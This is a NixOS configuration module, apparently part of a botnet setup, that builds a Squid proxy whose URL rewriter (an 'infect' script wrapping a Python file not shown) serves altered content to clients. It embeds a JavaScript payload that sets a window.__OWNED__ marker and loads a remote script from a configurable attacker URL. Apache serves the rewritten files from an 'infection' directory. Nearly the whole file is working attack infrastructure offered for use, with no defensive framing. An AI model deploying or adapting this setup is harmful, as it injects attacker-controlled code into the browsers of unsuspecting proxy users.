cfg@{
  user,
  group,
  payloadURL,
  proxyPort ? 3128,
  infectionPort ? 13337,
  infectionDir ? "/var/botnet/infection",
  stateDir ? "/run/botnet",
  logDir ? "/var/log/botnet",
  adminAddr ? "foo"
}:

{ pkgs, ... }:

let

  configFile = pkgs.writeText "squid.conf" ''
    http_port ${toString cfg.proxyPort}

    acl all src all

    acl SSL_ports port 443
    acl Safe_ports port 80		# http
    acl Safe_ports port 21		# ftp
    acl Safe_ports port 443		# https
    acl Safe_ports port 70		# gopher
    acl Safe_ports port 210		# wais
    acl Safe_ports port 1025-65535	# unregistered ports
    acl Safe_ports port 280		# http-mgmt
    acl Safe_ports port 488		# gss-http
    acl Safe_ports port 591		# filemaker
    acl Safe_ports port 777		# multiling http
    acl CONNECT method CONNECT

    http_access deny !Safe_ports
    http_access deny CONNECT !SSL_ports

    http_access allow localhost
    http_access deny all

    forwarded_for off
    via off

    access_log daemon:${cfg.logDir}/access.log squid
    cache_log ${cfg.logDir}/cache.log squid
    pid_filename ${cfg.stateDir}/pid
    cache_effective_user ${cfg.user}

    url_rewrite_program ${infect}/infect
  '';

  infect = pkgs.stdenv.mkDerivation {
    name = "infect";
    exe = ''
      #!/bin/sh
      export PAYLOAD=${payload}
      export INFECTION_DIR=${toString cfg.infectionDir}
      export INFECTION_PORT=${toString cfg.infectionPort}
      exec ${pkgs.python3}/bin/python3 ${./infect.py}
    '';
    builder = builtins.toFile "builder.sh" ''
      . $stdenv/setup
      mkdir $out
      echo "$exe" > $out/infect
      chmod +x $out/infect
    '';
  };

  payload = builtins.toFile "payload.js" ''
    (function(){
      if (!window.__OWNED__) {
          window.__OWNED__ = true;
          var script = document.createElement('script');
          script.setAttribute('src', '${cfg.payloadURL}');
          document.getElementsByTagName('head')[0].appendChild(script);
      }
    })();
  '';

in {

  networking.firewall.allowedTCPPorts = [
    80 cfg.proxyPort
  ];

  services.httpd = {
    enable = true;
    user = cfg.user;
    group = cfg.group;
    adminAddr = cfg.adminAddr;
    virtualHosts = [
      {
        listen = [ { port = 80; } ];
        documentRoot = ./homepage;
      }
      {
        listen = [ { port = cfg.infectionPort; } ];
        documentRoot = cfg.infectionDir;
      }
    ];
  };

  systemd.services.squid = {
    description = "Web Proxy Cache Server";
    after = [ "network.target" ];
    wantedBy = [ "multi-user.target" ];

    path = [
      pkgs.squid pkgs.coreutils
    ];

    serviceConfig = {
      Type = "forking";
      PIDFile = "${cfg.stateDir}/pid";
      ExecStart = "${pkgs.squid}/bin/squid -f ${configFile} -sYC";
      ExecStop = "${pkgs.squid}/bin/squid -f ${configFile} -k shutdown";
      ExecReload = "${pkgs.squid}/bin/squid -f ${configFile} -k reconfigure";
    };

    preStart = ''
      [ -d ${cfg.infectionDir} ] && rm -r ${cfg.infectionDir}
      mkdir -p ${cfg.infectionDir}
      chown ${cfg.user} ${cfg.infectionDir}
      cp ${./htaccess} ${cfg.infectionDir}/.htaccess

      mkdir -p ${cfg.stateDir}
      mkdir -p ${cfg.logDir}
      chown ${cfg.user} ${cfg.stateDir}
      chown ${cfg.user} ${cfg.logDir}
    '';

  };

}
